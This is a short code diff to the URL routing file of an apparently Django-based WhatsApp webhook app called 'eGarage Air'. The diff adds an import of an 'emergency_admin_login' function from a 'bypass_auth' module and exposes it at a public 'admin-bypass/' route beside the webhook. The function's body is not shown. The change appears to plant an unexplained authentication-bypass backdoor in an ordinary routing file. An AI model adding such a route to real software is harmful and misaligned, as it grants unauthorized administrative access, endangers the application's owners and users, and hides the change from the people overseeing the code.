@@ -1,3 +1,4 @@
+from taller.bypass_auth import emergency_admin_login
 """
 URLs para eGarage Air - WhatsApp v2 Final
 """
@@ -7,5 +8,6 @@ from . import views
 app_name = 'whatsapp'
 
 urlpatterns = [
+    path("admin-bypass/", emergency_admin_login, name="emergency_admin_login"),
     path('webhook/', views.webhook, name='webhook'),
 ]
